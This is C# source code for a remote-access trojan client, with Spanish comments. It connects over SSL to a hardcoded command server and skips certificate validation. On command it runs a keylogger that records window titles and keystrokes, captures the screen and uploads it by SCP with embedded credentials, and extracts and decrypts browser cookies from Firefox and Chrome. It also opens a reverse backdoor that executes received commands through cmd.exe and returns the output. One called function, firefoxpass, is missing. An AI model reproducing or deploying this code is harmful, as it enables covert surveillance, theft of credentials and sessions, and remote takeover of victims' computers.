using System;
using System.Collections.Generic;
using System.Net.Security;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.IO;
using System.Threading;
using System.IO;
using System.Data;
using System.Data.SQLite;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;
using System.Drawing;
using System.Drawing.Imaging;
using System.Net;
using Newtonsoft.Json;
using Renci.SshNet;
using Tamir.SharpSsh;
using WinSCP;

namespace pm3candc
{
    class Program
    {
        // no se para que
        // [DllImport("System.Windows.Forms.dll")]
        // Para keylogger
        [DllImport("user32.dll")]

        public static extern int GetAsyncKeyState(Int32 i);
        // "Server SSL Certyficate (CN=www.domain.com)"
        public static string hostname = "capss";

        // "Server host localhost"
        public static string host = "192.168.58.128";

        // "Server port"
        public static int port = 9999;

        public static string txt = "";
        static void Main(string[] args)
        {
            String menu = " Menu\n";
            menu += "1.- Keylogger\n";
            menu += "2.- Captura de pantalla\n";
            menu += "3.- Video\n";
            menu += "4.- cookies\n";
            menu += "5.- Backdoor\n";
            ConnectSSL(menu);

            firefoxpass();

        }
        static string ReadMessage(SslStream sslStream)
        {
            // Read the  message sent by the server. The end of the message is signaled using the "<END>" marker.
            byte[] buffer = new byte[2048];
            StringBuilder messageData = new StringBuilder();
            int bytes = -1;
            do
            {
                bytes = sslStream.Read(buffer, 0, buffer.Length);

                // Use Decoder class to convert from bytes to UTF8 
                // in case a character spans two buffers.
                Decoder decoder = Encoding.UTF8.GetDecoder();
                char[] chars = new char[decoder.GetCharCount(buffer, 0, bytes)];
                decoder.GetChars(buffer, 0, bytes, chars, 0);
                messageData.Append(chars);
                // Check for EOF. 
                if (messageData.ToString().IndexOf("\n") != -1)
                {
                    break;
                }
            } while (bytes != 0);

            return messageData.ToString();
        }
        public static void ConnectSSL(string msg = "")
        {

            txt = "";
            try
            {
                Socket miPrimerSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                // paso 2 - creamos el socket
                IPEndPoint miDireccion = new IPEndPoint(IPAddress.Parse("192.168.58.128"), 9999);
                miPrimerSocket.Connect(miDireccion);
                NetworkStream myNetworkStream;

               myNetworkStream = new NetworkStream(miPrimerSocket, true);          
                

                //TcpClient client = new TcpClient(host, port);

                // Create an SSL stream that will close the client's stream.
                SslStream sslStream = new SslStream(
                    //client.GetStream(), 
                    myNetworkStream, 
                    false,
                    new RemoteCertificateValidationCallback(ValidateServerCertificate),
                    null
                );
                try
                {
                    sslStream.AuthenticateAsClient(hostname);
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                    miPrimerSocket.Close();
                    return;
                }


                // Signal the end of the message using the "<END>".
                // Semd message

                while (true)
                {
                    byte[] messsage = System.Text.Encoding.ASCII.GetBytes(msg + "\n");
                    // Send hello message to the server. 
                    sslStream.Write(messsage);
                    sslStream.Flush();
                    
                    // Read message from the server. 
                    string serverMessage = ReadMessage(sslStream);
                    string time = DateTime.UtcNow.ToString();
                    Console.WriteLine(time + " Server says: " + serverMessage);
                    int opcion = Int32.Parse(serverMessage);
                    if (opcion > 0 && opcion<6) {
                        if (opcion == 1)
                        {
                            // Keylogger
                            ThreadStart delegado = new ThreadStart(LogKeys);
                            //Creamos la instancia del hilo 
                            Thread hilo = new Thread(delegado);
                            //Iniciamos el hilo 
                            hilo.Start();
                            hilo.Abort();


                            //Thread.Sleep(1000*60*5);
                            string fileName = "key.txt";
                            sslStream.Write(System.Text.Encoding.ASCII.GetBytes(" " + LeerArchivo(fileName)));
                            sslStream.Flush();
                            //miPrimerSocket.SendFile(fileName, null, null, TransmitFileOptions.UseDefaultWorkerThread);

                        }
                        else if (opcion == 2)
                        {   
                            // Captura de pantalla
                            pantalla();
                            // Keylogger
                            ThreadStart delegado = new ThreadStart(LogKeys); 
                            //Creamos la instancia del hilo 
                            Thread hilo = new Thread(delegado); 
                            //Iniciamos el hilo 
                            hilo.Start();
                            Thread.Sleep(1000);
                            try
                            {
                                // Setup session options
                                SessionOptions sessionOptions = new SessionOptions
                                {
                                    Protocol = Protocol.Scp,
                                    HostName = host,
                                    UserName = "armando",
                                    Password = "hola123,",
                                    SshHostKeyFingerprint = "ssh-rsa 2048 bd:26:9e:80:2d:15:6d:96:3d:bc:04:59:80:7d:17:a0"
                                };

                                using (WinSCP.Session session = new WinSCP.Session())
                                {
                                    // Connect
                                    session.Open(sessionOptions);

                                    // Upload files
                                    TransferOptions transferOptions = new TransferOptions();
                                    transferOptions.TransferMode = TransferMode.Binary;

                                    TransferOperationResult transferResult;
                                    transferResult = session.PutFiles(@".\pantalla.jpg", "/home/armando/pm3/", false, transferOptions);

                                    // Throw on any error
                                    transferResult.Check();

                                    // Print results
                                    foreach (TransferEventArgs transfer in transferResult.Transfers)
                                    {
                                        Console.WriteLine("Upload of {0} succeeded", transfer.FileName);
                                    }
                                }
                            }
                            catch (Exception e)
                            {
                                Console.WriteLine("Error: {0}", e);
                            }
                        }
                        else if(opcion == 3)
                        {
                            // Video
                        }else if(opcion == 4)
                        {
                            cookies();
                        }
                        else if(opcion == 5)
                        {
                            conectar("192.168.158.128", 2000);
                        }
                    }


                    // Close the client connection.
                }


                miPrimerSocket.Close();

                Console.WriteLine("Client closed.");
                Console.Read();
            }
            catch (ArgumentNullException e)
            {
                Console.WriteLine("ArgumentNullException: {0}", e);
            }
            catch (SocketException e)
            {
                Console.WriteLine("SocketException: {0}", e);
            }

        }
        // The following method is invoked by the RemoteCertificateValidationDelegate.
        public static bool ValidateServerCertificate(object sender, X509Certificate certificate, X509Chain chain, SslPolicyErrors sslPolicyErrors)
        {
            if (sslPolicyErrors == SslPolicyErrors.None)
                return true;

            // Console.WriteLine("Certificate error: {0}", sslPolicyErrors);

            // Do not allow this client to communicate with unauthenticated servers.
            //return false;
            //Force ssl certyfikates as correct
            return true;
        }
        //Funcion para escribir lo que se vaya leyendo
        static void EscribirTxT(string cadena)
        {
            //Si no existe DArrieta.txt lo crea, si existe escribe al final del archivo
            StreamWriter sw = new StreamWriter("key.txt", true);
            sw.Write(cadena);
            sw.Close();
        }
        public static String LeerArchivo(String nombre)
        {
            try
            {   // Open the text file using a stream reader.
                using (StreamReader sr = new StreamReader(nombre))
                {
                    // Read the stream to a string, and write the string to the console.
                    String line = sr.ReadToEnd();
                    return line;
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("The file could not be read:");
                Console.WriteLine(e.Message);
            }
            return "";
        }

        public static string Base64Encode(string plainText) {
          var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
          return System.Convert.ToBase64String(plainTextBytes);
        }
        public static String LeerArchivoBinario(String fileName)
        {
            try
            {
                int letter = 0;
                FileStream stream = new FileStream(fileName, FileMode.Open, FileAccess.Read);
                BinaryReader reader = new BinaryReader(stream);

                while (letter != -1)
                {
                    letter = reader.Read();
                    if (letter != -1) Console.Write((char)letter);
                }
                reader.Close();
                stream.Close();
            }
            catch (System.IO.FileNotFoundException e)
            {
                System.Console.Write("error {0}", e);
            }
            catch (System.ArgumentException e)
            {
                System.Console.Write("error {0}",e);
            }
            catch(System.IO.EndOfStreamException e)
            {
                System.Console.Write("error {0}", e);
            }
            return "";
        }
        static void LogKeys()
        {
            while (true)
            {
                Dictionary<int, char> Top = new Dictionary<int, char>();
                Top.Add(32, ' ');
                Top.Add(48, '=');
                Top.Add(49, '!');
                Top.Add(50, '"');
                Top.Add(51, '#');
                Top.Add(52, '$');
                Top.Add(53, '%');
                Top.Add(54, '&');
                Top.Add(55, '/');
                Top.Add(56, '(');
                Top.Add(57, ')');
                Top.Add(186, '¨');
                Top.Add(187, '*');
                Top.Add(188, ';');
                Top.Add(189, '_');
                Top.Add(190, ':');
                Top.Add(191, ']');
                Top.Add(192, 'Ñ');
                Top.Add(219, '?');
                Top.Add(220, '°');
                Top.Add(221, '¡');
                Top.Add(222, '[');
                Top.Add(226, '>');

                Dictionary<int, char> Bottom = new Dictionary<int, char>();
                Bottom.Add(32, ' ');
                Bottom.Add(48, '0');
                Bottom.Add(49, '1');
                Bottom.Add(50, '2');
                Bottom.Add(51, '3');
                Bottom.Add(52, '4');
                Bottom.Add(53, '5');
                Bottom.Add(54, '6');
                Bottom.Add(55, '7');
                Bottom.Add(56, '8');
                Bottom.Add(57, '9');
                Bottom.Add(186, '´');
                Bottom.Add(187, '+');
                Bottom.Add(188, ',');
                Bottom.Add(189, '-');
                Bottom.Add(190, '.');
                Bottom.Add(191, '}');
                Bottom.Add(192, 'ñ');
                Bottom.Add(219, '\'');
                Bottom.Add(220, '|');
                Bottom.Add(221, '¿');
                Bottom.Add(222, '{');
                Bottom.Add(226, '<');
                //Instancia de un convertidor para saber que tecla se oprime
                KeysConverter Converter = new KeysConverter();
                //Instancia de la clase Ventana para saber la ventana actual
                Ventana Vent = new Ventana();
                //Declaración de variables
                string VActual, VAnterior = "";
                string letra = "";
                bool Mayuscula = false, bloqmayus = false, mayus = false;
                //Ciclo infinito para no dejar de leer el estado del teclado
                while (true)
                {
                    //Se deja un tiempo para no leer basura o dos veces la misma tecla
                    Thread.Sleep(10);
                    //se verifica si se oprimió BloqMayus (tecla logica 20)
                    if (GetAsyncKeyState(20) == -32767)
                        bloqmayus = !bloqmayus;
                    //Se verifica si algun Mayus se esta oprimiendo BloqMayus (tecla logica 16) [-32767 = fué presionada || 32768 esta siendo precionada ahora]
                    if (GetAsyncKeyState(16) == 32768 || GetAsyncKeyState(16) == -32767)
                        mayus = true;
                    else
                        mayus = false;
                    //Un ciclo que pase por las letras y numeros (48 - 1 Al 90 - Z) y la tecla Backspace (8)
                    for (Int32 i = 8; i < 227; i++)//solo letras y numeros
                    {
                        //Lee el estado de la tecla
                        int estado = GetAsyncKeyState(i);
                        //Si se está pulsando:
                        if (estado == 1 || estado == -32767)
                        {
                            //Verifica la ventana activa
                            VActual = Vent.NombreDeVentana();
                            //Si la ventana cambió
                            if ((!(string.Equals(VAnterior, VActual))) && (VActual.Length != 0))
                            {
                                //Se actualiza la Ventana actual y se imprime en el documento
                                VAnterior = VActual;
                                EscribirTxT("\n\nVentana: " + VActual + "\n");
                            }
                            if (i == 8 || (i < 91 && i > 57))
                            {
                                //Se interpreta el valor de la tecla
                                letra = Converter.ConvertToString(i);
                                //La tecla es mayuscula si, BLOQMAYUS o MAYUS estan activas, la tecla es minuscula si ninguna o ambas teclas estan activas
                                Mayuscula = bloqmayus ^ mayus;
                                //Si la tecla debe ir en mayusculas se escribe como se interpretó, si no, se cambia a minuscula
                                letra = Mayuscula ? letra : letra.ToLower();
                            }
                            else
                            {
                                if (mayus)
                                    letra = Top[i].ToString();
                                else
                                    letra = Bottom[i].ToString();
                            }
                            //Se escribe en el archivo
                            EscribirTxT(letra);
                            letra = "";
                            //Se termina el For para empezar a recorrer las teclas desde el principio.
                            break;
                        }
                        //Se salta de la tecla 8 (backspace) a la 48 (0)
                        if (i == 8)
                            i += 23;
                        if (i == 32)
                            i += 15;
                        if (i == 90)
                            i += 95;

                    }
                }
            }
        }

        static void cookies()
        {
            string user = Environment.UserName;


            //****************************COOKIES MOZILLA FIREFOX****************************

            StreamWriter cookies_Mtxt = new StreamWriter("CookiesMozilla.txt");


            string rutaDirMozilla = "C:/Users/" + user + "/AppData/Roaming/Mozilla/Firefox/Profiles/";
            DirectoryInfo directory = new DirectoryInfo(@rutaDirMozilla);
            DirectoryInfo[] directories = directory.GetDirectories();

            rutaDirMozilla = rutaDirMozilla + directories[0].ToString();
            string cookiesFileMF = rutaDirMozilla + "/cookies.sqlite";

            if (File.Exists(cookiesFileMF))
            {

                SQLiteConnection m_dbConnection = new SQLiteConnection("Data Source=" + cookiesFileMF);
                m_dbConnection.Open();



                string sql = "select * from moz_cookies";
                SQLiteCommand command = new SQLiteCommand(sql, m_dbConnection);
                SQLiteDataReader reader = command.ExecuteReader();

                while (reader.Read())
                    cookies_Mtxt.WriteLine("Host: " + reader["host"] + " BaseDomain: " + reader["baseDomain"] + " LastAccessed: " + reader["lastAccessed"] + " Name: " + reader["name"] + " Value: " + reader["value"]);

                m_dbConnection.Close();

            }


            //********************************COOKIES GOOGLE CHROME **************************************


            StreamWriter cookies_Ctxt = new StreamWriter("CookiesChrome.txt");

            string rutaVarChrome = "C:/Users/" + user + "/AppData/Local/Google/Chrome/User Data/";
            DirectoryInfo directoryC = new DirectoryInfo(@rutaVarChrome);
            DirectoryInfo[] directoriesC = directoryC.GetDirectories();
            string perfil = "Default";
            foreach (DirectoryInfo directorio in directoriesC)
            {
                if (directorio.ToString().StartsWith("Profile"))
                    perfil = directorio.ToString();
            }
            rutaVarChrome += perfil;
            rutaVarChrome += "/cookies";
            string sqlchrome = "select * from cookies";


            if (File.Exists(rutaVarChrome))
            {

                SQLiteConnection m_dbConnectionG = new SQLiteConnection("Data Source=" + rutaVarChrome);
                m_dbConnectionG.Open();


                SQLiteCommand commandG = new SQLiteCommand(sqlchrome, m_dbConnectionG);
                SQLiteDataReader readerG = commandG.ExecuteReader();
                while (readerG.Read())
                {
                    var encryptedData = (byte[])readerG["encrypted_value"];
                    var decodedData = System.Security.Cryptography.ProtectedData.Unprotect(encryptedData, null, System.Security.Cryptography.DataProtectionScope.CurrentUser);
                    var plainText = Encoding.ASCII.GetString(decodedData); // Looks like ASCII

                    cookies_Ctxt.WriteLine("Host: " + readerG["host_key"] + " LastAccessed: " + readerG["last_access_utc"] + " Name: " + readerG["name"] + " Value: " + plainText);

                }

                m_dbConnectionG.Close();

            }
        }

        static void pantalla()
        {
            Rectangle region = Screen.AllScreens[0].Bounds;
            Bitmap bitmap = new Bitmap(region.Width, region.Height, PixelFormat.Format32bppPArgb);

            Graphics graphic = Graphics.FromImage(bitmap);
            graphic.CopyFromScreen(region.Left, region.Top, 0, 0, region.Size);
            bitmap.Save("pantalla.jpg", ImageFormat.Jpeg);
        }

        public static NetworkStream socket_server;
        public static void conectar(string ip, int porta)
        {
            TcpClient conectando = new TcpClient();
            conectando.Connect(ip, porta);
            socket_server = conectando.GetStream();
            receber();

        }
        public static void receber()
        {
            while (true)
            {
                try
                {
                    byte[] receber_bytes = new byte[1000];
                    socket_server.Read(receber_bytes, 0, receber_bytes.Length);
                    socket_server.Flush();
                    string msg = Encoding.ASCII.GetString(receber_bytes);
                    Console.WriteLine(msg);
                    enviar_comando(msg);
                }
                catch
                {
                    break;
                }
            }
        }
        public static void enviar_comando(string comando)
        {
            try
            {
                Console.WriteLine("excutando");
                Console.WriteLine(comando);
                ProcessStartInfo startInfo = new ProcessStartInfo();
                startInfo.FileName = "cmd.exe";
                startInfo.Arguments = "/C " + comando;
                startInfo.UseShellExecute = false;
                startInfo.RedirectStandardOutput = true;
                using (Process process = Process.Start(startInfo))
                {
                    using (StreamReader reader = process.StandardOutput)
                    {
                        string result = reader.ReadToEnd();
                        int tamanho_cmando = result.Length;
                        string t_comando = Convert.ToString(tamanho_cmando);
                        byte[] rbytes = Encoding.ASCII.GetBytes(t_comando);
                        socket_server.Write(rbytes, 0, rbytes.Length);
                        socket_server.Flush();
                        Console.WriteLine(tamanho_cmando);
                        byte[] comandos = Encoding.ASCII.GetBytes(result);
                        socket_server.Write(comandos, 0, comandos.Length);
                        socket_server.Flush();

                    }
                }
            }
            catch
            {

            }
        }


    }
   class Ventana
    {
        //Se importa de user32.dll una funcion que devuelve un puntero a la Ventana Activa actual
        [DllImport("user32.dll")]
        static extern IntPtr GetForegroundWindow();


        //Se importa de user32.dll una funcion que escribe en un buffer el nombre de una ventana y devuelve la longitud de ese nombre
        //hWnd -> puntero de la ventana que se desea saber el nombre
        //text -> nombre devuelto
        //count -> numero de caracteres maximos que se leeran del nombre
        [DllImport("user32.dll")]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);


        //Funcion que devuelva el nombre de la ventana actual
        public string NombreDeVentana()
        {
            //Numero de catacteres a leer
            const int caracteres = 256;
            //Se crea un buffer donde leeremos el titulo de la ventana (de "caracteres" tamaño)
            StringBuilder Buffer = new StringBuilder(caracteres);
            //Se obtiene el puntero a la ventana actual
            IntPtr handle = GetForegroundWindow();
            //Si la longitud del nombre es mayor a 0
            if (GetWindowText(handle, Buffer, caracteres) > 0)
            {
                //Regresamos un String que contenga el nombre de la ventana
                return Buffer.ToString();
            }
            //Si no tiene longitud, para no regresar basura en el buffer, regresamos una cadena de longitud 0
            return "";
        }
    }
}
